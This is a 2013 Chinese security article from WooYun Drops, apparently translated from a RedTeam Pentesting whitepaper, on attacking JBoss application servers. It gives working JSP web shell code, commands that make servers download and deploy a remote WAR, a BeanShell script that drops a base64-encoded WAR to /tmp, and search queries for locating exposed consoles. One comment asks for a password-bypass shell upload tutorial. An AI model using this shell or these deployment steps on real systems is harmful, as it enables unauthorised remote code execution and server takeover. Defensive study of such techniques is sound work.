@@ -1,0 +1,126 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">JBoss安全问题总结</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瞌睡龙</a> <span class="bull">·</span> <time title="2013/07/23 19:28" ui-time="" datetime="2013/07/23 19:28" class="published ng-binding ng-isolate-scope">2013/07/23 19:28</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h3>0x00 简介</h3><hr><p>JBoss应用服务器（JBoss AS）是一个被广泛使用的开源Java应用服务器。</p><p>它是JBoss企业中间件（JEMS）的一部分，并且经常在大型企业中使用。</p><p>因为这个软件是高度模块化和松耦合的，导致了它很很复杂，同时也使它易成为攻击者的目标。</p><p>本文从攻击者的角度来看，指出JBoss应用服务器存在的潜在风险，并结合例子如何实现如何在JBoss应用服务器上执行任意代码。</p><h3>0x01 JBoss概述</h3><p>JBoss应用服务器基于Java企业版1.4，并可以在应用在非常多操作系统中，包括Linux，FreeBSD和Windows中，只要操作系统中安装了Java虚拟机。</p><p><img alt="enter image description here" img-src="a558a45f242341ee7a07c67dc83d9a39e03e3e01.jpg"></p><p>JBoss应用服务架构</p><h4>Java管理扩展（JMX）</h4><p>Java管理扩展（JMX）是一个监控管理Java应用程序的标准化架构，JMX分为三层：</p><p><img alt="enter image description here" img-src="9cbab6b8f987f752bbca591a365a271838bd467e.jpg"></p><p>JMX架构</p><p>设备层（Instrumentation Level）：主要定义了信息模型。在JMX中，各种管理对象以管理构件的形式存在，需要管理时，向MBean服务器进行注册。该层还定义了通知机制以及一些辅助元数据类。</p><p>代理层（Agent Level）：主要定义了各种服务以及通信模型。该层的核心是一个MBean服务器，所有的管理构件都需要向它注册，才能被管理。注册在MBean服务器上管理构件并不直接和远程应用程序进行通信，它们通过协议适配器和连接器进行通信。而协议适配器和连接器也以管理构件的形式向MBean服务器注册才能提供相应的服务。</p><p>分布服务层（Distributed Service Level）：主要定义了能对代理层进行操作的管理接口和构件，这样管理者就可以操作代理。然而，当前的JMX规范并没有给出这一层的具体规范。</p><h4>JMX Invoker</h4><p>Invokers允许客户端应用程序发送任意协议的JMX请求到服务端。</p><p>这些调用都用过MBean服务器发送到响应的MBean服务。</p><p>传输机制都是透明的，并且可以使用任意的协议如：HTTP,SOAP2或JRMP3。</p><h4>Deployer架构</h4><p>攻击者对JBoss应用服务器中的Deployers模块特别感兴趣。</p><p>他们被用来部署不同的组成部分。</p><p>本文当中重点要将的安装组件：</p><p>JAR（Java ARchives）：JAR 文件格式以流行的 ZIP 文件格式为基础。与 ZIP 文件不同的是，JAR 文件不仅用于压缩和发布，而且还用于部署和封装库、组件和插件程序，并可被像编译器和 JVM 这样的工具直接使用。在 JAR 中包含特殊的文件，如 manifests 和部署描述符，用来指示工具如何处理特定的 JAR。</p><p>WAR（Web ARchives）：WAR文件是JAR文件包含一个Web应用程序的组件，与Java ServerPages（JSP），Java类，静态web页面等类似。</p><p>BSH（BeanSHell scripts）：BeanShell是Java脚本语言，BeanShell脚本使用Java语法，运行在JRE上。</p><p>最重要的JBoss应用服务器deployer是MainDeployer。它是部署组件的主要入口点。</p><p>传递给MainDeployer的部署组件的路径是一个URL形式：</p><pre><code>org.jboss.deployment.MainDeployer.deploy(String urlspec)
+</code></pre><p>MainDeployer会下载对象，并决定使用什么样的SubDeployer转发。</p><p>根据组件的类型，SubDeployer（例如：JarDeployer，SarDeployer等）接受对象进行安装。</p><p>为了方便部署，可以使用UrlDeploymentScanner，它同样获取一个URL作为参数：</p><pre><code>org.jboss.deployment.scanner.URLDeploymentScanner.addURL(String urlspec)
+</code></pre><p>传入的URL会被定期的检查是否有新的安装或更改。</p><p>这就是JBoss应用服务器如何实现热部署的，有新的或者更改的组件会被自动的部署。</p><h3>0x02 攻击</h3><hr><h4>WAR文件</h4><p>最简单的在JBoss应用服务器上运行自己的代码是部署一个组件，JBoss可以通过HTTP安装组件。</p><p>WAR文件包需要在WEB-INF目录下含一个web.xml文件，在实际的应用程序代码目录之外。</p><p>这是一个描述文件，描述了在什么URL将在之后的应用程序中发现。</p><p>WAR文件可以用Java的SDK jar命令创建：</p><pre><code>$ jar cvf redteam.war WEB-INF redteam.jsp
+</code></pre><p>redteam.war的结构目录：</p><pre><code>|-- META-INF
+|   -- MANIFEST.MF
+|-- WEB-INF
+|   -- web.xml 
+-- redteam.jsp
+</code></pre><p>META-INF/MANIFEST.MF是用jar创建文件时自动创建的，包含JAR的信息，例如：应用程序的主入口点（需要调用的类）或者需要什么额外的类。这里生成的文件中没有什么特别的信息，仅包含一些基本信息：</p><pre><code>Manifest-Version: 1.0 
+Created-By: 1.6.0_10 (Sun Microsystems Inc.) 
+</code></pre><p>WEB-INF/web.xml文件必须手动创建，它包含有关Web应用程序的信息，例如JSP文件，或者更详细的应用描述信息，如果发生错误，使用什么图标显示或者错误页面的名称等</p><pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;web-app xmlns="http://java.sun.com/xml/ns/j2ee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
+             http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
+         version="2.4"&gt;
+    &lt;servlet&gt;
+        &lt;servlet-name&gt;RedTeam Shell&lt;/servlet-name&gt;
+        &lt;jsp-file&gt;/redteam.jsp&lt;/jsp-file&gt;
+    &lt;/servlet&gt;
+&lt;/web-app&gt;
+</code></pre><p>redteam的内容：</p><pre><code>&lt;%@ page import="java.util.*,java.io.*"%&gt;
+&lt;%
+if (request.getParameter("cmd") != null) {
+  String cmd = request.getParameter("cmd");
+  Process p = Runtime.getRuntime().exec(cmd);
+  OutputStream os = p.getOutputStream();
+  InputStream in = p.getInputStream();
+  DataInputStream dis = new DataInputStream(in);
+  String disr = dis.readLine();
+  while ( disr != null ) {
+    out.println(disr);
+    disr = dis.readLine();
+} }
+%&gt;
+</code></pre><p>HTTP请求：</p><pre><code>/redteam.jsp?cmd=ls
+</code></pre><p>将会列出当前目录所有文件，命令执行后的结果会通过如下代码返回来：</p><pre><code>while ( disr != null ) {
+  out.println(disr);
+  disr = dis.readLine();
+}
+</code></pre><h4>JMX Console</h4><p>JMX控制台允许通过web浏览器与JBoss应用服务器直接互动的组件。</p><p>它可以方便的管理JBoss服务器，MBean的属性与方法可以直接调用，只要参数中没有复杂的参数类型。</p><p><img alt="enter image description here" img-src="615b4129c85b00e996be2a935c03c44abf09c817.jpg"></p><p>JMX控制台默认界面</p><p>这个通常是攻击者第一个目标。</p><p>Server- 和ServerInfo-MBean</p><h5>MBeans的属性</h5><pre><code>jboss.system:type=Server
+jboss.system:type=ServerInfo
+</code></pre><p>展现了JBoss应用服务器与主机系统的信息，包含Java虚拟机以及操作系统的类型版本信息。</p><p><img alt="enter image description here" img-src="268e1fce00a24c64f7302fd5cc7155019f1144ba.jpg"></p><p>MBean的属性</p><p>JMX控制台对MBeans可读可操作，不仅包含JBoss应用服务器本身的信息，同时包含主机信息，这些有助于进一步攻击。</p><p>MBean的shutdown()方法可以关闭JBoss应用服务器，未授权的JMX接口可以导致拒绝服务攻击。</p><h5>redteam.war安装</h5><p>MainDeployer的方法属性可以在JMX控制台中的jboss.system中调用。</p><p>deploy()方法可以由一个URL中一个参数调用，URL指向WAR文件，需要是服务器能够访问到的地址。</p><p>当invoke按钮被点击时，JBoss应用服务器会下载WAR文件并安装它，之后，就可以执行shell命令了</p><p><img alt="enter image description here" img-src="309f2a996365fe65460250451a4f6deb77d2b724.jpg"></p><p>deploy()方法</p><p><img alt="enter image description here" img-src="604294c8e9a092db5942c28e9106f59a8cadae79.jpg"></p><p>JBoss应用程序执行ls -l命令</p><h4>RMI: 远程方法调用</h4><p>通常JMX控制台保护方法是加一个密码保护。</p><p>然而这不是访问JBoss应用服务器组件的唯一方式，JBoss应用服务器经常与客户端程序接口相互调用，Java远程方法调用（RMI）也发挥重要作用。</p><p>使用RMI，本地应用程序可以访问远程对象，并可以调用它们的方法。客户端与服务器之间的通信是透明的。</p><p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。</p><p>JNDI可访问的现有的目录及服务有：</p><p>DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。</p><h5>通过RMI访问MBean</h5><p>RMI接口默认凯奇在端口4444上，JNDI接口默认开启在1098和1099上。</p><p>与JBoss应用服务器RMI通信，可以使用专门的Java程序。更简单的方式是使用twiddle，包括JBoss应用服务器的安装。</p><pre><code>$ sh jboss-4.2.3.GA/bin/twiddle.sh -h
+A JMX client to ’twiddle’ with a remote JBoss server.
+usage: twiddle.sh [options] &lt;command&gt; [command_arguments]
+options:
+    -h, --help                   Show this help message
+        --help-commands          Show a list of commands
+    -H=&lt;command&gt;                 Show command specific help
+-c=command.properties            Specify the command.properties file to use
+-D&lt;name&gt;[=&lt;value&gt;]               Set a system property
+--                               Stop procession options
+-s, --server=&lt;url&gt;               The JNDI URL of the remote server
+-a, --adapter=&lt;name&gt;             The JNDI name of the RMI adapter to user
+-u, --user=&lt;name&gt;                Specify the username for authentication
+-p, --password=&lt;name&gt;            Specify the password for authentication
+-q, --quiet                      Be somewhat more quiet
+</code></pre><p>有了twiddle，就用可用命令行通过RMI调用JBoss应用服务器的MBeans。Windows下是twiddle.bat，Linux下是twiddle.sh来启动twiddle。类似于JMX控制台，MBEAN的属性可读可改，并且可以调用其方法。</p><p>显示MBean服务器的信息</p><pre><code>$ ./twiddle.sh -s scribus get jboss.system:type=ServerInfo
+ActiveThreadCount=50
+AvailableProcessors=1
+OSArch=amd64
+MaxMemory=518979584
+HostAddress=127.0.1.1
+JavaVersion=1.6.0_06
+OSVersion=2.6.24-19-server
+JavaVendor=Sun Microsystems Inc.
+TotalMemory=129957888
+ActiveThreadGroupCount=7
+OSName=Linux
+FreeMemory=72958384
+HostName=scribus
+JavaVMVersion=10.0-b22
+JavaVMVendor=Sun Microsystems Inc.
+JavaVMName=Java HotSpot(TM) 64-Bit Server VM
+</code></pre><h5>安装redteam.war</h5><p>根据twiddle的帮助利用deploy()方法安装war文件。</p><pre><code>$ ./twiddle.sh -s scribus invoke jboss.system:service=MainDeployer deploy http://www.redteam-pentesting.de/redteam.war
+</code></pre><p>通过下面的URL访问shell：</p><pre><code>http://scribus:8080/redteam/redteam-shell.jsp
+</code></pre><h4>BSHDeployer</h4><p>利用RMI攻击需要JBoss应用服务器能够访问远程HTTP服务器。</p><p>然而在很多配置中，防火墙不允许JBoss服务器对外发出连接请求：</p><p><img alt="enter image description here" img-src="fbc28d28ef448e28c8c973bfaf88a8df6c4390cd.jpg"></p><p>为了能够在JBoss服务器上安装redteam.war，这个文件需要放在本地。</p><p>虽然JBoss不允许直接直接上传文件，但是有BeanShellDeployer，我们可以在远程服务器上创建任意文件。</p><h5>BeanShell</h5><p>BeanShell是一种运行在JRE上的脚本语言，该语言支持常规的Java语法。可以很快写完，并且不需要编译。</p><h5>BSHDeployer</h5><p>JBoss服务器中BSHDeployer可以部署BeanShell脚本，它会安装后自动执行。</p><p>利用BSHDeployer安装的方法是：</p><pre><code>createScriptDeployment(String bshScript, String scriptName)
+</code></pre><h5>BeanShell脚本</h5><p>可以用下面的BeanShell脚本实现把redteam.war放到JBoss服务器上。</p><pre><code>import java.io.FileOutputStream;
+import sun.misc.BASE64Decoder;
+// Base64 encoded redteam.war
+String val = "UEsDBBQACA[...]AAAAA";
+BASE64Decoder decoder = new BASE64Decoder();
+byte[] byteval = decoder.decodeBuffer(val);
+FileOutputStream fs = new FileOutputStream("/tmp/redteam.war");
+fs.write(byteval);
+fs.close();
+</code></pre><p>变量val中是redteam.war文件的base64编码后的字符串，脚本在tmp目录下生成redteam.war文件，Windows中可以填写C:WINDOWSTEMP。</p><h5>安装redteam.war文件</h5><p>利用twiddle，可以使用DSHDeployer的createScriptDeployement()方法：</p><pre><code>$ ./twiddle.sh -s scribus invoke jboss.deployer:service=BSHDeployer createScriptDeployment "‘cat redteam.bsh‘" redteam.bsh 
+</code></pre><p>tedteam.bsh包含上面的BeanShell脚本，调用成功后JBoss服务器返回BeanShell创建的临时文件地址：</p><pre><code>file:/tmp/redteam.bsh55918.bsh 
+</code></pre><p>当BeanShell脚本执行部署后，会创建/tmp/redteam.war文件，现在就可以通过调用本地文件来部署了：</p><pre><code>$ ./twiddle.sh -s scribus invoke jboss.system:service=MainDeployer deploy file:/tmp/redteam.war 
+</code></pre><p>之后就可以访问redteam-shell.jsp来执行命令了。</p><h4>Web Console Invoker</h4><p>通过JMX控制台与RMI来控制JBoss服务器是最常用的方法。</p><p>除了这些还有更隐蔽的接口，其中之一就是Web控制台中使用JMXInvoker。</p><h5>Web控制台</h5><p>Web控制台与JMX控制台类似，也可以通过浏览器访问。</p><p>Web控制台的默认界面：</p><p><img alt="enter image description here" img-src="bfd09f0647f5f2ae88f7cd9ebc2eca7955aa619b.jpg"></p><p>如果JMX控制台有密码保护的话，是不可以通过Web控制台访问MBean的函数的，需要登陆后才能访问。</p><h5>Web控制台JMX Invoker</h5><p>Web控制台除了可以看到组建的梳妆接口与JBoss服务器信息外，还可监视MBean属性的实时变化。</p><p>访问URL：</p><pre><code>http://$hostname/web-console/Invoker 
+</code></pre><p>这个Invoker其实就是JMX Invoker，而不局限于Web控制台提供的功能。</p><p>默认情况下，访问是不受限制的，所以攻击者可以用它来发送任意的JMX命令到JBoss服务器。</p><h5>安装redteam.war</h5><p>用Web控制台的Invoker安装redteam.war文件。</p><p>webconsole_invoker.rb可以直接调用Web控制的JMX Invoker，使用的Java类是：org.jboss.console.remote.Util</p><p>Util.class文件属于JBoss服务器的JAR文件：console-mgr-classes.jar，它提供的方法：</p><pre><code>public static Object invoke(
+    java.net.URL externalURL,
+    RemoteMBeanInvocation mi)
+public static Object getAttribute(
+    java.net.URL externalURL,
+    RemoteMBeanAttributeInvocation mi)
+</code></pre><p>通过Web控制台Invoker可以读取MBean的属性与invoke方法。</p><p>这个类可以通过webconsole_invoker.rb脚本使用，使用方法如下：</p><pre><code>$ ./webconsole_invoker.rb -h
+Usage: ./webconsole_invoker.rb [options] MBean
+￼-u, --url URL  The Invoker URL to use (default:http://localhost:8080/web-console/Invoker)
+-a, --get-attr ATTR             Read an attribute of an MBean
+-i, --invoke METHOD             invoke an MBean method
+-p, --invoke-params PARAMS      MBean method params
+-s, --invoke-sigs SIGS          MBean method signature
+-t, --test                      Test the script with the ServerInfo MBean
+-h, --help                      Show this help
+
+Example usage:
+./webconsole_invoker.rb -a OSVersion jboss.system:type=ServerInfo
+./webconsole_invoker.rb -i listThreadDump jboss.system:type=ServerInfo
+./webconsole_invoker.rb -i listMemoryPools -p true -s boolean jboss.system:type=ServerInfo 
+</code></pre><p>通过如下命令利用BSHDeployer来安装redteam.war文件。</p><pre><code>$ ./webconsole_invoker.rb -u http://scribus:8080/web-console/Invoker -i createScriptDeployment -s "java.lang.String","java.lang.String" -p "`cat redteam.bsh`",redteam.bsh jboss.deployer:service=BSHDeployer
+</code></pre><p>在远程服务器上创建一个本地的redteam.war文件，现在第二部就可以利用MainDeployer安装/tmp/redteam.war文件了。</p><pre><code>$ ./webconsole_invoker.rb -u http://scribus:8080/web-console/Invoker -i deploy -s "java.lang.String" -p "file:/tmp/redteam.war" jboss.system:service=MainDeployer
+</code></pre><p>redteam-shell.jsp又可以访问了。</p><h4>JMXInvokerServlet</h4><p>之前提到过JBoss服务器允许任何协议访问MBean服务器，对于HTTP，JBoss提供HttpAdaptor。</p><p>默认安装中，HttpAdaptor是没有启用的，但是HttpAdaptor的JMX Invoker可以通过URL直接访问。</p><pre><code>http://$hostname/invoker/JMXInvokerServlet 
+</code></pre><p>这个接口接受HTTP POST请求后，转发到MBean，因此与Web控制台Invoker类似，JMXInvokerServlet也可以发送任意的JMX调用到JBoss服务器。</p><h5>创建MarshalledInvocation对象</h5><p>JMXInvokerServlet的调用与Web控制台Invoker不兼容，所以不能使用webconsole_invoker.rb脚本调用。</p><p>MarshalledInvocation对象通常只在内部JBoss服务器上做交流。</p><p>httpinvoker.rb脚本与webconsole_invoker.rb脚本类似，但是需要JBoss服务器激活HttpAdaptor</p><pre><code>$ ./httpinvoker.rb -h
+Usage: ./httpinvoker.rb [options] MBean
+￼-j, --jndi URL               The JNDI URL to use (default:http://localhost:8080/invoker/JNDIFactory)
+-p, --adaptor URL            The Adaptor URL to use (default:jmx/invoker/HttpAdaptor)
+-a, --get-attr ATTR          Read an attribute of an MBean
+-i,  --invoke METHOD         invoke an MBe an method          
+     --invoke-params PARAMS  MBean method params
+-s, --invoke-sigs SIGS       MBean method signature
+-t, --test                   Test the script with the ServerInfo MBean
+-h, --help                   Show this help
+</code></pre><h5>安装tedteam.war</h5><p>与webconsole_invoker.rb安装类似。</p><p>寻找JBoss服务器的方法：</p><pre><code>inurl:"jmx-console/HtmlAdaptor"
+intitle:"Welcome to JBoss"
+</code></pre><p>From: <a href="http://www.redteam-pentesting.de/publications/2009-11-30-Whitepaper_Whos-the-JBoss-now_RedTeam-Pentesting_EN.pdf">Whitepaper&#95;Whos-the-JBoss-now&#95;RedTeam-Pentesting_EN</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141017203549ef27b55a7921e022214b5780c48f81e0.png" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/web/7550" rel="bookmark" id="re1">Bool型SSRF的思考与实践</a></li><li><a href="http://drops.wooyun.org/tips/349" rel="bookmark" id="re2">解密JBoss和Weblogic数据源连接字符串和控制台密码</a></li><li><a href="http://drops.wooyun.org/papers/10801" rel="bookmark" id="re3">从反序列化到命令执行 - Java 中的 POP 执行链</a></li><li><a href="http://drops.wooyun.org/papers/6045" rel="bookmark" id="re4">安卓动态调试七种武器之长生剑 - Smali Instrumentation</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">情痴</span> <span class="reply-time">2016-02-05 11:58:45</span></div><p></p><p>谢谢LZ分享，收藏了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">crown丶prince</span> <span class="reply-time">2015-12-27 09:38:01</span></div><p></p><p>很有用的总结</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小苹果</span> <span class="reply-time">2015-02-03 22:40:31</span></div><p></p><p>楼主能不能更新下绕过密码的上传shell的教程额？、谢谢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">laterain</span> <span class="reply-time">2014-08-26 16:23:34</span></div><p></p><p>挺不错的文章<br>但是RMI和JNDI的端口默认都是绑在lo接口上的，外部没法访问啊，有办法解决吗？除了用来本地提权而外</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">luwikes</span> <span class="reply-time">2013-10-28 14:05:29</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ivan</span> <span class="reply-time">2013-09-26 15:45:59</span></div><p></p><p>好文章~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Gavin</span> <span class="reply-time">2013-07-24 17:44:01</span></div><p></p><p>LZ又发好文了~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">菜菜来报道</span> <span class="reply-time">2013-07-24 12:40:43</span></div><p></p><p>太高深了，若有所懂的样子</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">有妹子送上</span> <span class="reply-time">2013-07-24 07:15:18</span></div><p></p><p>学习了。，</p><p></p></div></div></div></div></div></main>
